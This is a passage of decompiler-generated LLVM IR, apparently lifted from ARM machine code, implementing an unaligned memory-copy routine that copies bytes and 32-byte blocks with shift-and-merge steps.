  %v2_fb1c = load i32, i32* @r5, align 4
  store i32 %v2_fb1c, i32* %stack_var_-40, align 4
  %v5_fb1c = load i32, i32* @r6, align 4
  %v8_fb1c = load i32, i32* @r7, align 4
  %v11_fb1c = load i32, i32* @r8, align 4
  %v14_fb1c = load i32, i32* @sb, align 4
  %v17_fb1c = load i32, i32* @sl, align 4
  %v20_fb1c = load i32, i32* @fp, align 4
  %v1_fb20 = sub i32 0, %v1_fa90
  %v1_fb24 = urem i32 %v1_fb20, 4
  store i32 %v1_fb24, i32* %r5.global-to-local, align 4
  %v3_fb28 = mul nuw nsw i32 %v1_fb24, 8
  store i32 %v3_fb28, i32* @ip, align 4
  %v1_fb2c = sub nsw i32 32, %v3_fb28
  store i32 %v1_fb2c, i32* %lr.global-to-local, align 4
  %v1_fb30 = inttoptr i32 %v1_fa60 to i32*
  %v2_fb30 = load i32, i32* %v1_fb30, align 4
  store i32 %v2_fb30, i32* @r3, align 4
  %v4_fb30 = add i32 %v1_fa60, 4
  store i32 %v4_fb30, i32* @r1, align 4
  store i32 %v1_fb14, i32* %r2.global-to-local, align 4
  %v1_fb38 = and i32 %v1_fb20, 2
  %v2_fb38 = icmp ne i32 %v1_fb38, 0
  store i1 %v2_fb38, i1* %cpsr_c.global-to-local, align 1
  %v3_fb38 = shl i32 %v1_fb20, 31
  store i32 %v3_fb38, i32* %r5.global-to-local, align 4
  %v4_fb38 = icmp ne i32 %v3_fb38, 0
  store i1 %v4_fb38, i1* %cpsr_n.global-to-local, align 1
  %v2_fb3c = trunc i32 %v2_fb30 to i8
  br i1 %v4_fb38, label %bb147, label %thread-pre-split

bb147:                                            ; preds = %dec_label_pc_fb1c
  %v4_fb3c = inttoptr i32 %v1_fa90 to i8*
  store i8 %v2_fb3c, i8* %v4_fb3c, align 1
  %v5_fb3c = load i32, i32* %r0.global-to-local, align 4
  %v6_fb3c = add i32 %v5_fb3c, 1
  store i32 %v6_fb3c, i32* %r0.global-to-local, align 4
  %v0_fb40.pr = load i1, i1* %cpsr_n.global-to-local, align 1
  br i1 %v0_fb40.pr, label %bb148, label %.thread-pre-split_crit_edge

.thread-pre-split_crit_edge:                      ; preds = %bb147
  %v0_fb44.pr.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fb44.pr.pre, label %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge, label %.thread9

.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge: ; preds = %.thread-pre-split_crit_edge
  %v1_fb44.pre.pre = load i32, i32* @r3, align 4
  %extract.t192 = trunc i32 %v1_fb44.pre.pre to i8
  br label %bb149

thread-pre-split:                                 ; preds = %dec_label_pc_fb1c
  br i1 %v2_fb38, label %bb149, label %.thread9

bb148:                                            ; preds = %bb147
  %v1_fb40 = load i32, i32* @r3, align 4
  %v2_fb40 = and i32 %v1_fb40, 128
  %v3_fb40 = icmp ne i32 %v2_fb40, 0
  store i1 %v3_fb40, i1* %cpsr_c.global-to-local, align 1
  %v4_fb40 = udiv i32 %v1_fb40, 256
  store i32 %v4_fb40, i32* @r3, align 4
  %extract.t86 = trunc i32 %v4_fb40 to i8
  br i1 %v3_fb40, label %bb149, label %.thread9

bb149:                                            ; preds = %thread-pre-split, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge, %bb148
  %v3_fb44 = phi i32 [ %v6_fb3c, %bb148 ], [ %v6_fb3c, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge ], [ %v1_fa90, %thread-pre-split ]
  %v1_fb44.off0 = phi i8 [ %extract.t86, %bb148 ], [ %extract.t192, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge ], [ %v2_fb3c, %thread-pre-split ]
  %v4_fb44 = inttoptr i32 %v3_fb44 to i8*
  store i8 %v1_fb44.off0, i8* %v4_fb44, align 1
  %v5_fb44 = load i32, i32* %r0.global-to-local, align 4
  %v6_fb44 = add i32 %v5_fb44, 1
  store i32 %v6_fb44, i32* %r0.global-to-local, align 4
  %v0_fb48.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fb48.pr, label %bb150, label %.thread9

bb150:                                            ; preds = %bb149
  %v1_fb48 = load i32, i32* @r3, align 4
  %v2_fb48 = and i32 %v1_fb48, 128
  %v3_fb48 = icmp ne i32 %v2_fb48, 0
  store i1 %v3_fb48, i1* %cpsr_c.global-to-local, align 1
  %v4_fb48 = udiv i32 %v1_fb48, 256
  store i32 %v4_fb48, i32* @r3, align 4
  br i1 %v3_fb48, label %.thread6, label %.thread9

.thread6:                                         ; preds = %bb150
  %v2_fb4c = trunc i32 %v4_fb48 to i8
  %v4_fb4c = inttoptr i32 %v6_fb44 to i8*
  store i8 %v2_fb4c, i8* %v4_fb4c, align 1
  %v5_fb4c = load i32, i32* %r0.global-to-local, align 4
  %v6_fb4c = add i32 %v5_fb4c, 1
  store i32 %v6_fb4c, i32* %r0.global-to-local, align 4
  %v0_fb50.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fb50.pr.pr, label %bb151, label %.thread9

bb151:                                            ; preds = %.thread6
  %v1_fb50 = load i32, i32* @r3, align 4
  %v2_fb50 = and i32 %v1_fb50, 128
  %v3_fb50 = icmp ne i32 %v2_fb50, 0
  store i1 %v3_fb50, i1* %cpsr_c.global-to-local, align 1
  %v4_fb50 = udiv i32 %v1_fb50, 256
  store i32 %v4_fb50, i32* @r3, align 4
  br label %.thread9

.thread9:                                         ; preds = %.thread-pre-split_crit_edge, %bb149, %bb148, %thread-pre-split, %bb150, %.thread6, %bb151
  %v0_fb5c30 = phi i32 [ %v6_fb44, %bb149 ], [ %v6_fb3c, %bb148 ], [ %v1_fa90, %thread-pre-split ], [ %v6_fb44, %bb150 ], [ %v6_fb4c, %.thread6 ], [ %v6_fb4c, %bb151 ], [ %v6_fb3c, %.thread-pre-split_crit_edge ]
  %v0_fb54 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb54 = add i32 %v0_fb54, -4
  %v2_fb54 = icmp ugt i32 %v0_fb54, 3
  store i1 %v2_fb54, i1* %cpsr_c.global-to-local, align 1
  %v6_fb54 = icmp slt i32 %v1_fb54, 0
  store i1 %v6_fb54, i1* %cpsr_n.global-to-local, align 1
  %v3_fb58 = icmp ult i32 %v0_fb54, 2
  br i1 %v3_fb58, label %dec_label_pc_fce4, label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %.thread9, %dec_label_pc_fb64
  %v0_fb68 = phi i32 [ %v0_fb78, %dec_label_pc_fb64 ], [ %v0_fb54, %.thread9 ]
  %v1_fb74 = phi i32 [ %v4_fb74, %dec_label_pc_fb64 ], [ %v0_fb5c30, %.thread9 ]
  %v1_fb5c = and i32 %v1_fb74, 28
  %v2_fb5c = icmp eq i32 %v1_fb5c, 0
  br i1 %v2_fb5c, label %dec_label_pc_fb84.loopexit, label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb5c
  %v0_fb64 = load i32, i32* @r1, align 4
  %v1_fb64 = inttoptr i32 %v0_fb64 to i32*
  %v2_fb64 = load i32, i32* %v1_fb64, align 4
  store i32 %v2_fb64, i32* %r5.global-to-local, align 4
  %v4_fb64 = add i32 %v0_fb64, 4
  store i32 %v4_fb64, i32* @r1, align 4
  %v1_fb68 = add i32 %v0_fb68, -4
  store i32 %v1_fb68, i32* %r2.global-to-local, align 4
  %v0_fb6c = load i32, i32* @r3, align 4
  %v2_fb6c = load i32, i32* %lr.global-to-local, align 4
  %v7_fb6c = shl i32 %v2_fb64, %v2_fb6c
  %v8_fb6c = or i32 %v7_fb6c, %v0_fb6c
  store i32 %v8_fb6c, i32* %r4.global-to-local, align 4
  %v1_fb70 = load i32, i32* @ip, align 4
  %v6_fb70 = lshr i32 %v2_fb64, %v1_fb70
  store i32 %v6_fb70, i32* @r3, align 4
  %v2_fb74 = inttoptr i32 %v1_fb74 to i32*
  store i32 %v8_fb6c, i32* %v2_fb74, align 4
  %v3_fb74 = load i32, i32* %r0.global-to-local, align 4
  %v4_fb74 = add i32 %v3_fb74, 4
  store i32 %v4_fb74, i32* %r0.global-to-local, align 4
  %v0_fb78 = load i32, i32* %r2.global-to-local, align 4
  %v2_fb78 = icmp ugt i32 %v0_fb78, 3
  store i1 %v2_fb78, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_fb78, label %dec_label_pc_fb5c, label %dec_label_pc_fb80

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb64
  %v1_fb78 = add i32 %v0_fb78, -4
  %v6_fb78 = icmp slt i32 %v1_fb78, 0
  store i1 %v6_fb78, i1* %cpsr_n.global-to-local, align 1
  %v3_fb80 = icmp ult i32 %v0_fb78, 2
  br i1 %v3_fb80, label %dec_label_pc_fce4, label %dec_label_pc_fb84

dec_label_pc_fb84.loopexit:                       ; preds = %dec_label_pc_fb5c
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fb84.loopexit, %dec_label_pc_fb80
  %v0_fbec37 = phi i32 [ %v1_fb74, %dec_label_pc_fb84.loopexit ], [ %v4_fb74, %dec_label_pc_fb80 ]
  %v0_fb84 = phi i32 [ %v0_fb68, %dec_label_pc_fb84.loopexit ], [ %v0_fb78, %dec_label_pc_fb80 ]
  %v1_fb84 = add i32 %v0_fb84, -32
  store i32 %v1_fb84, i32* %r2.global-to-local, align 4
  %v2_fb84 = icmp ugt i32 %v0_fb84, 31
  store i1 %v2_fb84, i1* %cpsr_c.global-to-local, align 1
  %v6_fb84 = icmp slt i32 %v1_fb84, 0
  store i1 %v6_fb84, i1* %cpsr_n.global-to-local, align 1
  %v3_fb88 = icmp ult i32 %v1_fb84, 30
  br i1 %v3_fb88, label %dec_label_pc_fcb8, label %dec_label_pc_fb8c

dec_label_pc_fb8c:                                ; preds = %dec_label_pc_fb84
  %v0_fb8c = load i32, i32* @ip, align 4
  %v1_fb8c = add i32 %v0_fb8c, -24
  %v2_fb8c = icmp ugt i32 %v0_fb8c, 23
  store i1 %v2_fb8c, i1* %cpsr_c.global-to-local, align 1
  %v6_fb8c = icmp slt i32 %v1_fb8c, 0
  store i1 %v6_fb8c, i1* %cpsr_n.global-to-local, align 1
  %v7_fb8c = icmp eq i32 %v0_fb8c, 24
  br i1 %v7_fb8c, label %dec_label_pc_fc5c, label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb8c
  %v1_fb94 = add i32 %v0_fb8c, -8
  %v2_fb94 = icmp ugt i32 %v0_fb8c, 7
  store i1 %v2_fb94, i1* %cpsr_c.global-to-local, align 1
  %v6_fb94 = icmp slt i32 %v1_fb94, 0
  store i1 %v6_fb94, i1* %cpsr_n.global-to-local, align 1
  %v7_fb94 = icmp eq i32 %v0_fb8c, 8
  %v0_fbfc = load i32, i32* @r1, align 4
  %v1_fbfc = inttoptr i32 %v0_fbfc to i32*
  %v2_fbfc = load i32, i32* %v1_fbfc, align 4
  store i32 %v2_fbfc, i32* %ip.global-to-local, align 4
  %v4_fbfc = add i32 %v0_fbfc, 4
  br i1 %v7_fb94, label %dec_label_pc_fc00, label %dec_label_pc_fba0

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb94, %.dec_label_pc_fba0_crit_edge
  %v0_fbec = phi i32 [ %v24_fbec, %.dec_label_pc_fba0_crit_edge ], [ %v0_fbec37, %dec_label_pc_fb94 ]
  %v0_fba8 = phi i32 [ %v0_fba8.pre, %.dec_label_pc_fba0_crit_edge ], [ %v1_fb84, %dec_label_pc_fb94 ]
  %v0_fba4 = phi i32 [ %v0_fba4.pre, %.dec_label_pc_fba0_crit_edge ], [ %v4_fbfc, %dec_label_pc_fb94 ]
  %v1_fbb0 = phi i32 [ %v0_fba0.pre, %.dec_label_pc_fba0_crit_edge ], [ %v2_fbfc, %dec_label_pc_fb94 ]
  store i32 %v1_fbb0, i32* %r4.global-to-local, align 4
  %v1_fba4 = inttoptr i32 %v0_fba4 to i32*
  %v2_fba4 = load i32, i32* %v1_fba4, align 4
  store i32 %v2_fba4, i32* %r5.global-to-local, align 4
  %v3_fba4 = add i32 %v0_fba4, 4
  %v4_fba4 = inttoptr i32 %v3_fba4 to i32*
  %v5_fba4 = load i32, i32* %v4_fba4, align 4
  store i32 %v5_fba4, i32* %r6.global-to-local, align 4
  %v6_fba4 = add i32 %v0_fba4, 8
  %v7_fba4 = inttoptr i32 %v6_fba4 to i32*
  %v8_fba4 = load i32, i32* %v7_fba4, align 4
  store i32 %v8_fba4, i32* %r7.global-to-local, align 4
  %v9_fba4 = add i32 %v0_fba4, 12
  %v10_fba4 = inttoptr i32 %v9_fba4 to i32*
  %v11_fba4 = load i32, i32* %v10_fba4, align 4
  store i32 %v11_fba4, i32* %r8.global-to-local, align 4
  %v12_fba4 = add i32 %v0_fba4, 16
  %v13_fba4 = inttoptr i32 %v12_fba4 to i32*
  %v14_fba4 = load i32, i32* %v13_fba4, align 4
  store i32 %v14_fba4, i32* %sb.global-to-local, align 4
  %v15_fba4 = add i32 %v0_fba4, 20
  %v16_fba4 = inttoptr i32 %v15_fba4 to i32*
  %v17_fba4 = load i32, i32* %v16_fba4, align 4
  store i32 %v17_fba4, i32* %sl.global-to-local, align 4
  %v18_fba4 = add i32 %v0_fba4, 24
  %v19_fba4 = inttoptr i32 %v18_fba4 to i32*
  %v20_fba4 = load i32, i32* %v19_fba4, align 4
  store i32 %v20_fba4, i32* %fp.global-to-local, align 4
  %v21_fba4 = add i32 %v0_fba4, 28
  store i32 %v21_fba4, i32* @r1, align 4
  %v1_fba8 = add i32 %v0_fba8, -32
  store i32 %v1_fba8, i32* %r2.global-to-local, align 4
  %v2_fba8 = icmp ugt i32 %v0_fba8, 31
  br i1 %v2_fba8, label %bb152, label %bb153

bb152:                                            ; preds = %dec_label_pc_fba0
  %v2_fbac = inttoptr i32 %v21_fba4 to i32*
  %v3_fbac = load i32, i32* %v2_fbac, align 4
  store i32 %v3_fbac, i32* %ip.global-to-local, align 4
  %v5_fbac = add i32 %v0_fba4, 32
  store i32 %v5_fbac, i32* @r1, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_fba0, %bb152
  %v0_fbb0 = load i32, i32* @r3, align 4
  %v4_fbb0 = mul i32 %v1_fbb0, 65536
  %v5_fbb0 = or i32 %v0_fbb0, %v4_fbb0
  %v3_fbb4 = udiv i32 %v1_fbb0, 65536
  %v4_fbb8 = mul i32 %v2_fba4, 65536
  %v5_fbb8 = or i32 %v4_fbb8, %v3_fbb4
  store i32 %v5_fbb8, i32* %r4.global-to-local, align 4
  %v3_fbbc = udiv i32 %v2_fba4, 65536
  %v4_fbc0 = mul i32 %v5_fba4, 65536
  %v5_fbc0 = or i32 %v4_fbc0, %v3_fbbc
  store i32 %v5_fbc0, i32* %r5.global-to-local, align 4
  %v3_fbc4 = udiv i32 %v5_fba4, 65536
  %v4_fbc8 = mul i32 %v8_fba4, 65536
  %v5_fbc8 = or i32 %v4_fbc8, %v3_fbc4
  store i32 %v5_fbc8, i32* %r6.global-to-local, align 4
  %v3_fbcc = udiv i32 %v8_fba4, 65536
  %v4_fbd0 = mul i32 %v11_fba4, 65536
  %v5_fbd0 = or i32 %v4_fbd0, %v3_fbcc
  store i32 %v5_fbd0, i32* %r7.global-to-local, align 4
  %v3_fbd4 = udiv i32 %v11_fba4, 65536
  %v4_fbd8 = mul i32 %v14_fba4, 65536
  %v5_fbd8 = or i32 %v4_fbd8, %v3_fbd4
  store i32 %v5_fbd8, i32* %r8.global-to-local, align 4
  %v3_fbdc = udiv i32 %v14_fba4, 65536
  %v4_fbe0 = mul i32 %v17_fba4, 65536
  %v5_fbe0 = or i32 %v4_fbe0, %v3_fbdc
  store i32 %v5_fbe0, i32* %sb.global-to-local, align 4
  %v3_fbe4 = udiv i32 %v17_fba4, 65536
  %v4_fbe8 = mul i32 %v20_fba4, 65536
  %v5_fbe8 = or i32 %v4_fbe8, %v3_fbe4
  store i32 %v5_fbe8, i32* %sl.global-to-local, align 4
  %v1_fbec = inttoptr i32 %v0_fbec to i32*
  store i32 %v5_fbb0, i32* %v1_fbec, align 4
  %v3_fbec = add i32 %v0_fbec, 4
  %v4_fbec = inttoptr i32 %v3_fbec to i32*
  %v5_fbec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fbec, i32* %v4_fbec, align 4
  %v6_fbec = add i32 %v0_fbec, 8
  %v7_fbec = inttoptr i32 %v6_fbec to i32*
  %v8_fbec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fbec, i32* %v7_fbec, align 4
  %v9_fbec = add i32 %v0_fbec, 12
  %v10_fbec = inttoptr i32 %v9_fbec to i32*
  %v11_fbec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_fbec, i32* %v10_fbec, align 4
  %v12_fbec = add i32 %v0_fbec, 16
  %v13_fbec = inttoptr i32 %v12_fbec to i32*
  %v14_fbec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_fbec, i32* %v13_fbec, align 4
  %v15_fbec = add i32 %v0_fbec, 20
  %v16_fbec = inttoptr i32 %v15_fbec to i32*
  %v17_fbec = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_fbec, i32* %v16_fbec, align 4
  %v18_fbec = add i32 %v0_fbec, 24
  %v19_fbec = inttoptr i32 %v18_fbec to i32*
  %v20_fbec = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_fbec, i32* %v19_fbec, align 4
  %v21_fbec = add i32 %v0_fbec, 28
  %v22_fbec = inttoptr i32 %v21_fbec to i32*
  %v23_fbec = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_fbec, i32* %v22_fbec, align 4
  %v24_fbec = add i32 %v0_fbec, 32
  store i32 %v24_fbec, i32* %r0.global-to-local, align 4
  %v0_fbf0 = load i32, i32* %fp.global-to-local, align 4
  %v1_fbf0 = and i32 %v0_fbf0, 32768
  %v2_fbf0 = icmp eq i32 %v1_fbf0, 0
  %v3_fbf0 = udiv i32 %v0_fbf0, 65536
  store i32 %v3_fbf0, i32* @r3, align 4
  br i1 %v2_fbf0, label %dec_label_pc_fcb8.loopexit18, label %.dec_label_pc_fba0_crit_edge

.dec_label_pc_fba0_crit_edge:                     ; preds = %bb153
  %v0_fba0.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_fba4.pre = load i32, i32* @r1, align 4
  %v0_fba8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fba0

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fb94, %.dec_label_pc_fc00_crit_edge
  %v0_fc4c = phi i32 [ %v24_fc4c, %.dec_label_pc_fc00_crit_edge ], [ %v0_fbec37, %dec_label_pc_fb94 ]
  %v0_fc08 = phi i32 [ %v0_fc08.pre, %.dec_label_pc_fc00_crit_edge ], [ %v1_fb84, %dec_label_pc_fb94 ]
  %v0_fc04 = phi i32 [ %v0_fc04.pre, %.dec_label_pc_fc00_crit_edge ], [ %v4_fbfc, %dec_label_pc_fb94 ]
  %v1_fc10 = phi i32 [ %v0_fc00.pre, %.dec_label_pc_fc00_crit_edge ], [ %v2_fbfc, %dec_label_pc_fb94 ]
  store i32 %v1_fc10, i32* %r4.global-to-local, align 4
  %v1_fc04 = inttoptr i32 %v0_fc04 to i32*
  %v2_fc04 = load i32, i32* %v1_fc04, align 4
  store i32 %v2_fc04, i32* %r5.global-to-local, align 4
  %v3_fc04 = add i32 %v0_fc04, 4
  %v4_fc04 = inttoptr i32 %v3_fc04 to i32*
  %v5_fc04 = load i32, i32* %v4_fc04, align 4
  store i32 %v5_fc04, i32* %r6.global-to-local, align 4
  %v6_fc04 = add i32 %v0_fc04, 8
  %v7_fc04 = inttoptr i32 %v6_fc04 to i32*
  %v8_fc04 = load i32, i32* %v7_fc04, align 4
  store i32 %v8_fc04, i32* %r7.global-to-local, align 4
  %v9_fc04 = add i32 %v0_fc04, 12
  %v10_fc04 = inttoptr i32 %v9_fc04 to i32*
  %v11_fc04 = load i32, i32* %v10_fc04, align 4
  store i32 %v11_fc04, i32* %r8.global-to-local, align 4
  %v12_fc04 = add i32 %v0_fc04, 16
  %v13_fc04 = inttoptr i32 %v12_fc04 to i32*
  %v14_fc04 = load i32, i32* %v13_fc04, align 4
  store i32 %v14_fc04, i32* %sb.global-to-local, align 4
  %v15_fc04 = add i32 %v0_fc04, 20
  %v16_fc04 = inttoptr i32 %v15_fc04 to i32*
  %v17_fc04 = load i32, i32* %v16_fc04, align 4
  store i32 %v17_fc04, i32* %sl.global-to-local, align 4
  %v18_fc04 = add i32 %v0_fc04, 24
  %v19_fc04 = inttoptr i32 %v18_fc04 to i32*
  %v20_fc04 = load i32, i32* %v19_fc04, align 4
  store i32 %v20_fc04, i32* %fp.global-to-local, align 4
  %v21_fc04 = add i32 %v0_fc04, 28
  store i32 %v21_fc04, i32* @r1, align 4
  %v1_fc08 = add i32 %v0_fc08, -32
  store i32 %v1_fc08, i32* %r2.global-to-local, align 4
  %v2_fc08 = icmp ugt i32 %v0_fc08, 31
  br i1 %v2_fc08, label %bb154, label %bb155

bb154:                                            ; preds = %dec_label_pc_fc00
  %v2_fc0c = inttoptr i32 %v21_fc04 to i32*
  %v3_fc0c = load i32, i32* %v2_fc0c, align 4
  store i32 %v3_fc0c, i32* %ip.global-to-local, align 4
  %v5_fc0c = add i32 %v0_fc04, 32
  store i32 %v5_fc0c, i32* @r1, align 4
  br label %bb155

bb155:                                            ; preds = %dec_label_pc_fc00, %bb154
  %v0_fc10 = load i32, i32* @r3, align 4
  %v4_fc10 = mul i32 %v1_fc10, 16777216
  %v5_fc10 = or i32 %v0_fc10, %v4_fc10
  %v3_fc14 = udiv i32 %v1_fc10, 256
  %v4_fc18 = mul i32 %v2_fc04, 16777216
  %v5_fc18 = or i32 %v4_fc18, %v3_fc14
  store i32 %v5_fc18, i32* %r4.global-to-local, align 4
  %v3_fc1c = udiv i32 %v2_fc04, 256
  %v4_fc20 = mul i32 %v5_fc04, 16777216
  %v5_fc20 = or i32 %v4_fc20, %v3_fc1c
  store i32 %v5_fc20, i32* %r5.global-to-local, align 4
  %v3_fc24 = udiv i32 %v5_fc04, 256
  %v4_fc28 = mul i32 %v8_fc04, 16777216
  %v5_fc28 = or i32 %v4_fc28, %v3_fc24
  store i32 %v5_fc28, i32* %r6.global-to-local, align 4
  %v3_fc2c = udiv i32 %v8_fc04, 256
  %v4_fc30 = mul i32 %v11_fc04, 16777216
  %v5_fc30 = or i32 %v4_fc30, %v3_fc2c
  store i32 %v5_fc30, i32* %r7.global-to-local, align 4
  %v3_fc34 = udiv i32 %v11_fc04, 256
  %v4_fc38 = mul i32 %v14_fc04, 16777216
  %v5_fc38 = or i32 %v4_fc38, %v3_fc34
  store i32 %v5_fc38, i32* %r8.global-to-local, align 4
  %v3_fc3c = udiv i32 %v14_fc04, 256
  %v4_fc40 = mul i32 %v17_fc04, 16777216
  %v5_fc40 = or i32 %v4_fc40, %v3_fc3c
  store i32 %v5_fc40, i32* %sb.global-to-local, align 4
  %v3_fc44 = udiv i32 %v17_fc04, 256
  %v4_fc48 = mul i32 %v20_fc04, 16777216
  %v5_fc48 = or i32 %v4_fc48, %v3_fc44
  store i32 %v5_fc48, i32* %sl.global-to-local, align 4
  %v1_fc4c = inttoptr i32 %v0_fc4c to i32*
  store i32 %v5_fc10, i32* %v1_fc4c, align 4
  %v3_fc4c = add i32 %v0_fc4c, 4
  %v4_fc4c = inttoptr i32 %v3_fc4c to i32*
  %v5_fc4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fc4c, i32* %v4_fc4c, align 4
  %v6_fc4c = add i32 %v0_fc4c, 8
  %v7_fc4c = inttoptr i32 %v6_fc4c to i32*
  %v8_fc4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fc4c, i32* %v7_fc4c, align 4
  %v9_fc4c = add i32 %v0_fc4c, 12
  %v10_fc4c = inttoptr i32 %v9_fc4c to i32*
  %v11_fc4c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_fc4c, i32* %v10_fc4c, align 4
  %v12_fc4c = add i32 %v0_fc4c, 16
  %v13_fc4c = inttoptr i32 %v12_fc4c to i32*
  %v14_fc4c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_fc4c, i32* %v13_fc4c, align 4
  %v15_fc4c = add i32 %v0_fc4c, 20
  %v16_fc4c = inttoptr i32 %v15_fc4c to i32*
  %v17_fc4c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_fc4c, i32* %v16_fc4c, align 4
  %v18_fc4c = add i32 %v0_fc4c, 24
  %v19_fc4c = inttoptr i32 %v18_fc4c to i32*
  %v20_fc4c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_fc4c, i32* %v19_fc4c, align 4
  %v21_fc4c = add i32 %v0_fc4c, 28
  %v22_fc4c = inttoptr i32 %v21_fc4c to i32*
  %v23_fc4c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_fc4c, i32* %v22_fc4c, align 4
  %v24_fc4c = add i32 %v0_fc4c, 32
  store i32 %v24_fc4c, i32* %r0.global-to-local, align 4
  %v0_fc50 = load i32, i32* %fp.global-to-local, align 4
  %v1_fc50 = and i32 %v0_fc50, 128
  %v2_fc50 = icmp eq i32 %v1_fc50, 0
  %v3_fc50 = udiv i32 %v0_fc50, 256
  store i32 %v3_fc50, i32* @r3, align 4
  br i1 %v2_fc50, label %dec_label_pc_fcb8.loopexit17, label %.dec_label_pc_fc00_crit_edge

.dec_label_pc_fc00_crit_edge:                     ; preds = %bb155
  %v0_fc00.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_fc04.pre = load i32, i32* @r1, align 4
  %v0_fc08.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fc00

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fb8c
  %v0_fc5c = load i32, i32* @r1, align 4
  %v1_fc5c = inttoptr i32 %v0_fc5c to i32*
  %v2_fc5c = load i32, i32* %v1_fc5c, align 4
  store i32 %v2_fc5c, i32* %ip.global-to-local, align 4
  %v4_fc5c = add i32 %v0_fc5c, 4
  br label %dec_label_pc_fc60

dec_label_pc_fc60:                                ; preds = %.dec_label_pc_fc60_crit_edge, %dec_label_pc_fc5c
  %v0_fcac = phi i32 [ %v24_fcac, %.dec_label_pc_fc60_crit_edge ], [ %v0_fbec37, %dec_label_pc_fc5c ]
  %v0_fc68 = phi i32 [ %v0_fc68.pre, %.dec_label_pc_fc60_crit_edge ], [ %v1_fb84, %dec_label_pc_fc5c ]
  %v0_fc64 = phi i32 [ %v0_fc64.pre, %.dec_label_pc_fc60_crit_edge ], [ %v4_fc5c, %dec_label_pc_fc5c ]
  %v1_fc70 = phi i32 [ %v0_fc60.pre, %.dec_label_pc_fc60_crit_edge ], [ %v2_fc5c, %dec_label_pc_fc5c ]
  store i32 %v1_fc70, i32* %r4.global-to-local, align 4
  %v1_fc64 = inttoptr i32 %v0_fc64 to i32*
  %v2_fc64 = load i32, i32* %v1_fc64, align 4
  store i32 %v2_fc64, i32* %r5.global-to-local, align 4
  %v3_fc64 = add i32 %v0_fc64, 4
  %v4_fc64 = inttoptr i32 %v3_fc64 to i32*
  %v5_fc64 = load i32, i32* %v4_fc64, align 4
  store i32 %v5_fc64, i32* %r6.global-to-local, align 4
  %v6_fc64 = add i32 %v0_fc64, 8
  %v7_fc64 = inttoptr i32 %v6_fc64 to i32*
  %v8_fc64 = load i32, i32* %v7_fc64, align 4
  store i32 %v8_fc64, i32* %r7.global-to-local, align 4
  %v9_fc64 = add i32 %v0_fc64, 12
  %v10_fc64 = inttoptr i32 %v9_fc64 to i32*
  %v11_fc64 = load i32, i32* %v10_fc64, align 4
  store i32 %v11_fc64, i32* %r8.global-to-local, align 4
  %v12_fc64 = add i32 %v0_fc64, 16
  %v13_fc64 = inttoptr i32 %v12_fc64 to i32*
  %v14_fc64 = load i32, i32* %v13_fc64, align 4
  store i32 %v14_fc64, i32* %sb.global-to-local, align 4
  %v15_fc64 = add i32 %v0_fc64, 20
  %v16_fc64 = inttoptr i32 %v15_fc64 to i32*
  %v17_fc64 = load i32, i32* %v16_fc64, align 4
  store i32 %v17_fc64, i32* %sl.global-to-local, align 4
  %v18_fc64 = add i32 %v0_fc64, 24
  %v19_fc64 = inttoptr i32 %v18_fc64 to i32*
  %v20_fc64 = load i32, i32* %v19_fc64, align 4
  store i32 %v20_fc64, i32* %fp.global-to-local, align 4
  %v21_fc64 = add i32 %v0_fc64, 28
  store i32 %v21_fc64, i32* @r1, align 4
  %v1_fc68 = add i32 %v0_fc68, -32
  store i32 %v1_fc68, i32* %r2.global-to-local, align 4
  %v2_fc68 = icmp ugt i32 %v0_fc68, 31
  br i1 %v2_fc68, label %bb156, label %bb157

bb156:                                            ; preds = %dec_label_pc_fc60
  %v2_fc6c = inttoptr i32 %v21_fc64 to i32*
  %v3_fc6c = load i32, i32* %v2_fc6c, align 4
  store i32 %v3_fc6c, i32* %ip.global-to-local, align 4
  %v5_fc6c = add i32 %v0_fc64, 32
  store i32 %v5_fc6c, i32* @r1, align 4
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_fc60, %bb156
  %v0_fc70 = load i32, i32* @r3, align 4
  %v4_fc70 = mul i32 %v1_fc70, 256
  %v5_fc70 = or i32 %v0_fc70, %v4_fc70
  %v3_fc74 = udiv i32 %v1_fc70, 16777216
  %v4_fc78 = mul i32 %v2_fc64, 256
  %v5_fc78 = or i32 %v4_fc78, %v3_fc74
  store i32 %v5_fc78, i32* %r4.global-to-local, align 4
  %v3_fc7c = udiv i32 %v2_fc64, 16777216
